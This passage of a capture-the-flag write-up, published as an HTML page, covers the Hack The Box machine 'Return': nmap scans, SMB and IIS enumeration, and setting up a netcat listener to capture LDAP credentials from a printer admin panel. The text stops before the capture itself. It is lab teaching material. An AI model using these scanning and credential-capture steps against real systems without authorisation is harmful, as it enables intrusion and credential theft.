@@ -1,0 +1,816 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+        <meta name="author" content="Matthieu Mezirard">
+    
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta name="description" content="This is an easy Windows box.">
+    
+    <title>
+        
+            
+        
+        root@mmezirard:~&#x2F;htb-write-ups&#x2F;boxes&#x2F;return#
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            Return<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2024-02-06</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.png"
+                src="https://mmezirard.github.io/htb-write-ups/boxes/return/cover.png"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#host-10-10-11-108">Host 10.10.11.108</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#scanning">Scanning</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#ports">Ports</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#fingerprinting">Fingerprinting</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#scripts">Scripts</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#services-enumeration">Services enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#smb">SMB</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#iis">IIS</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#foothold-winrm">Foothold (WinRM)</a>
+                                </li>
+
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#getting-a-lay-of-the-land">Getting a lay of the land</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#architecture">Architecture</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#version">Version</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#hotfixes">Hotfixes</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#users">Users</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#groups">Groups</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#nics">NICs</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#system-enumeration">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#flags">Flags</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#access-tokens">Access tokens</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#privilege-escalation-privileged-security-group">Privilege escalation (Privileged security group)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#preparation">Preparation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#exploitation">Exploitation</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#system-enumeration-1">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#flags-1">Flags</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                        </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/return/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<p><strong>OS</strong>: Windows</p>
+<p><strong>Release date</strong>: 2017-07-28</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/13531">MrR3boot</a></p>
+<h1 id="setup">Setup</h1>
+<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great
+practice security-wise, but it's a VM so it's alright. This way I won't have to
+prefix some commands with <code>sudo</code>, which gets cumbersome in the long run.</p>
+<p>I like to maintain consistency in my workflow for every box, so before starting
+with the actual pentest, I'll prepare a few things:</p>
+<ol>
+<li>
+<p>I'll create a directory that will contain every file related to this box.
+I'll call it <code>workspace</code>, and it will be located at the root of my filesystem
+<code>/</code>.</p>
+</li>
+<li>
+<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll use
+<code>httpsimpleserver</code> to create an HTTP server on port <code>80</code> and
+<code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make
+files in this folder available over the Internet, which will be especially
+useful for transferring files to the target machine if need be!</p>
+</li>
+<li>
+<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory.
+This will come in handy once we get a foothold, for privilege escalation and
+for pivoting inside the internal network.</p>
+</li>
+</ol>
+<p>I'll also strive to minimize the use of Metasploit, because it hides the
+complexity of some exploits, and prefer a more manual approach when it's not too
+much hassle. This way, I'll have a better understanding of the exploits I'm
+running, and I'll have more control over what's happening on the machine.</p>
+<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.9</code>. The
+commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever
+need to transfer files or binaries to the target machine, I'll always place them
+in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
+<p>Now we should be ready to go!</p>
+<h1 id="host-10-10-11-108">Host <code>10.10.11.108</code></h1>
+<h2 id="scanning">Scanning</h2>
+<h3 id="ports">Ports</h3>
+<p>As usual, let's start by initiating a port scan on Return using a TCP SYN <code>nmap</code>
+scan to assess its attack surface.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.108<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT      STATE SERVICE
+</span><span class="z-text z-plain">53/tcp    open  domain
+</span><span class="z-text z-plain">80/tcp    open  http
+</span><span class="z-text z-plain">88/tcp    open  kerberos-sec
+</span><span class="z-text z-plain">135/tcp   open  msrpc
+</span><span class="z-text z-plain">139/tcp   open  netbios-ssn
+</span><span class="z-text z-plain">389/tcp   open  ldap
+</span><span class="z-text z-plain">445/tcp   open  microsoft-ds
+</span><span class="z-text z-plain">464/tcp   open  kpasswd5
+</span><span class="z-text z-plain">593/tcp   open  http-rpc-epmap
+</span><span class="z-text z-plain">636/tcp   open  ldapssl
+</span><span class="z-text z-plain">3268/tcp  open  globalcatLDAP
+</span><span class="z-text z-plain">3269/tcp  open  globalcatLDAPssl
+</span><span class="z-text z-plain">5985/tcp  open  wsman
+</span><span class="z-text z-plain">9389/tcp  open  adws
+</span><span class="z-text z-plain">47001/tcp open  winrm
+</span><span class="z-text z-plain">49664/tcp open  unknown
+</span><span class="z-text z-plain">49665/tcp open  unknown
+</span><span class="z-text z-plain">49666/tcp open  unknown
+</span><span class="z-text z-plain">49668/tcp open  unknown
+</span><span class="z-text z-plain">49671/tcp open  unknown
+</span><span class="z-text z-plain">49676/tcp open  unknown
+</span><span class="z-text z-plain">49677/tcp open  unknown
+</span><span class="z-text z-plain">49678/tcp open  unknown
+</span><span class="z-text z-plain">49681/tcp open  unknown
+</span><span class="z-text z-plain">49731/tcp open  unknown
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's also check the 500 most common UDP ports.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.108<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>top-ports</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>500<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT     STATE         SERVICE
+</span><span class="z-text z-plain">53/udp   open          domain
+</span><span class="z-text z-plain">88/udp   open          kerberos-sec
+</span><span class="z-text z-plain">123/udp  open          ntp
+</span><span class="z-text z-plain">137/udp  open|filtered netbios-ns
+</span><span class="z-text z-plain">138/udp  open|filtered netbios-dgm
+</span><span class="z-text z-plain">389/udp  open|filtered ldap
+</span><span class="z-text z-plain">464/udp  open|filtered kpasswd5
+</span><span class="z-text z-plain">500/udp  open|filtered isakmp
+</span><span class="z-text z-plain">4500/udp open|filtered nat-t-ike
+</span><span class="z-text z-plain">5353/udp open|filtered zeroconf
+</span><span class="z-text z-plain">5355/udp open|filtered llmnr
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h3 id="fingerprinting">Fingerprinting</h3>
+<p>Following the ports scans, let's gather more data about the services associated
+with the open TCP ports we found.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.108<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT      STATE SERVICE       VERSION
+</span><span class="z-text z-plain">53/tcp    open  domain        Simple DNS Plus
+</span><span class="z-text z-plain">80/tcp    open  http          Microsoft IIS httpd 10.0
+</span><span class="z-text z-plain">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-04 15:43:17Z)
+</span><span class="z-text z-plain">135/tcp   open  msrpc         Microsoft Windows RPC
+</span><span class="z-text z-plain">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span><span class="z-text z-plain">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
+</span><span class="z-text z-plain">445/tcp   open  microsoft-ds?
+</span><span class="z-text z-plain">464/tcp   open  kpasswd5?
+</span><span class="z-text z-plain">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span><span class="z-text z-plain">636/tcp   open  tcpwrapped
+</span><span class="z-text z-plain">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
+</span><span class="z-text z-plain">3269/tcp  open  tcpwrapped
+</span><span class="z-text z-plain">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span><span class="z-text z-plain">9389/tcp  open  mc-nmf        .NET Message Framing
+</span><span class="z-text z-plain">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span><span class="z-text z-plain">Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's do the same for the UDP ports.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.108<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>53,88,123,137,138,389,464,500,4500,5353,5355<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT     STATE         SERVICE      VERSION
+</span><span class="z-text z-plain">53/udp   open          domain       (generic dns response: SERVFAIL)
+</span><span class="z-text z-plain">88/udp   open          kerberos-sec Microsoft Windows Kerberos (server time: 2024-02-04 15:43:57Z)
+</span><span class="z-text z-plain">123/udp  open          ntp          NTP v3
+</span><span class="z-text z-plain">137/udp  open|filtered netbios-ns
+</span><span class="z-text z-plain">138/udp  open|filtered netbios-dgm
+</span><span class="z-text z-plain">389/udp  open|filtered ldap
+</span><span class="z-text z-plain">464/udp  open|filtered kpasswd5
+</span><span class="z-text z-plain">500/udp  open|filtered isakmp
+</span><span class="z-text z-plain">4500/udp open|filtered nat-t-ike
+</span><span class="z-text z-plain">5353/udp open|filtered zeroconf
+</span><span class="z-text z-plain">5355/udp open|filtered llmnr
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Alright, so <code>nmap</code> managed to determine that Return is running Windows, and that
+its hostname is <code>PRINTER</code>.</p>
+<p>Based on the open ports we found, it may also be a DC.</p>
+<h3 id="scripts">Scripts</h3>
+<p>Let's run <code>nmap</code>'s default scripts on the TCP services to see if they can find
+additional information.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.108<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT      STATE SERVICE
+</span><span class="z-text z-plain">53/tcp    open  domain
+</span><span class="z-text z-plain">80/tcp    open  http
+</span><span class="z-text z-plain">|_http-title: HTB Printer Admin Panel
+</span><span class="z-text z-plain">| http-methods: 
+</span><span class="z-text z-plain">|_  Potentially risky methods: TRACE
+</span><span class="z-text z-plain">88/tcp    open  kerberos-sec
+</span><span class="z-text z-plain">135/tcp   open  msrpc
+</span><span class="z-text z-plain">139/tcp   open  netbios-ssn
+</span><span class="z-text z-plain">389/tcp   open  ldap
+</span><span class="z-text z-plain">445/tcp   open  microsoft-ds
+</span><span class="z-text z-plain">464/tcp   open  kpasswd5
+</span><span class="z-text z-plain">593/tcp   open  http-rpc-epmap
+</span><span class="z-text z-plain">636/tcp   open  ldapssl
+</span><span class="z-text z-plain">3268/tcp  open  globalcatLDAP
+</span><span class="z-text z-plain">3269/tcp  open  globalcatLDAPssl
+</span><span class="z-text z-plain">5985/tcp  open  wsman
+</span><span class="z-text z-plain">9389/tcp  open  adws
+</span><span class="z-text z-plain">47001/tcp open  winrm
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Host script results:
+</span><span class="z-text z-plain">|_clock-skew: 18m33s
+</span><span class="z-text z-plain">| smb2-time: 
+</span><span class="z-text z-plain">|   date: 2024-02-04T15:46:21
+</span><span class="z-text z-plain">|_  start_date: N/A
+</span><span class="z-text z-plain">| smb2-security-mode: 
+</span><span class="z-text z-plain">|   3:1:1: 
+</span><span class="z-text z-plain">|_    Message signing enabled and required
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's also run them on the UDP services.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.108<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>53,88,123,137,138,389,464,500,4500,5353,5355<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT     STATE         SERVICE
+</span><span class="z-text z-plain">53/udp   open|filtered domain
+</span><span class="z-text z-plain">88/udp   open          kerberos-sec
+</span><span class="z-text z-plain">123/udp  open          ntp
+</span><span class="z-text z-plain">| ntp-info: 
+</span><span class="z-text z-plain">|_  
+</span><span class="z-text z-plain">137/udp  open|filtered netbios-ns
+</span><span class="z-text z-plain">138/udp  open|filtered netbios-dgm
+</span><span class="z-text z-plain">389/udp  open|filtered ldap
+</span><span class="z-text z-plain">464/udp  open|filtered kpasswd5
+</span><span class="z-text z-plain">500/udp  open|filtered isakmp
+</span><span class="z-text z-plain">4500/udp open|filtered nat-t-ike
+</span><span class="z-text z-plain">5353/udp open|filtered zeroconf
+</span><span class="z-text z-plain">5355/udp open|filtered llmnr
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Host script results:
+</span><span class="z-text z-plain">|_clock-skew: 18m43s
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h2 id="services-enumeration">Services enumeration</h2>
+<h3 id="smb">SMB</h3>
+<h4 id="exploring-the-shares">Exploring the shares</h4>
+<p>Let's try to list the SMB shares with a NULL session, since we have no
+credentials at our disposal.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> smbclient<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>L</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>//10.10.11.108<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>N</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">        Sharename       Type      Comment
+</span><span class="z-text z-plain">        ---------       ----      -------
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>It found none!</p>
+<h4 id="known-vulnerabilities">Known vulnerabilities</h4>
+<p>Exploring the content of the SMB server proved to be unsuccessful. But maybe
+it's vulnerable to known exploits?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.108<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>445<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>script</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>vuln<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT    STATE SERVICE
+</span><span class="z-text z-plain">445/tcp open  microsoft-ds
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Host script results:
+</span><span class="z-text z-plain">|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
+</span><span class="z-text z-plain">|_smb-vuln-ms10-054: false
+</span><span class="z-text z-plain">|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>It isn't.</p>
+<h3 id="iis">IIS</h3>
+<h4 id="exploration">Exploration</h4>
+<p>Let's browse to <code>http://10.10.11.108/</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/return/iis-homepage.png" alt="IIS homepage" /></p>
+<p>This is an administrator panel for an HTB printer.</p>
+<h4 id="fingerprinting-1">Fingerprinting</h4>
+<p>Let's fingerprint the technologies used by this web page with the
+<a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/return/iis-homepage-wappalyzer.png" alt="IIS homepage Wappalyzer extension" /></p>
+<p>This reveals that this web page is using PHP version <code>7.4.13</code>.</p>
+<h4 id="exploration-1">Exploration</h4>
+<p>The only web page we have access to (aside from the homepage) is <code>/settings.php</code>:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/return/iis-settings-page.png" alt="IIS settings page" /></p>
+<p>We land on a settings page with a form. We have the possibility of modifying the
+server address, server port, username and password of an unknown service.</p>
+<p>I tried editing all the fields, but nothing happened.</p>
+<h4 id="under-the-hood">Under the hood</h4>
+<p>In fact, when we change a setting, a POST request is sent to <code>/settings.php</code>
+with the POST data:</p>
+<pre data-lang="html" class="language-html z-code"><code class="language-html" data-lang="html"><span class="z-text z-html z-basic">ip=<span class="z-meta z-tag z-other z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span></span><span class="z-meta z-tag z-other z-html"><span class="z-entity z-name z-tag z-other z-html">IP</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>
+</span></code></pre>
+<p>Therefore, we can assume that we're not actually able to edit the other fields.
+It's not clear what this web page is used for... maybe it's used to
+automatically log in to the specified IP using the port, username and password
+in the form, and change something?</p>
+<p>I also tried inspecting the HTML code to see if the password was written in
+cleartext, but unfortunately it isn't.</p>
+<h4 id="obtaining-credentials">Obtaining credentials</h4>
+<p>If our theory is right, the system logs in to the specified IP and the port
+<code>389</code> (corresponding to LDAP) using the credentials in the form, which we can't
+access. However, we're able to edit the IP the system connects to! If we enter
+our own IP, maybe it will try to log in to it, hence disclosing the hidden
+credentials?</p>
+<p>Let's try this!</p>
+<p>I'll open a listener on my own machine on port <code>389</code>:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>389<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>Then I'll send a POST request to <code>settings.php</code> with the IP set to my own.</p>
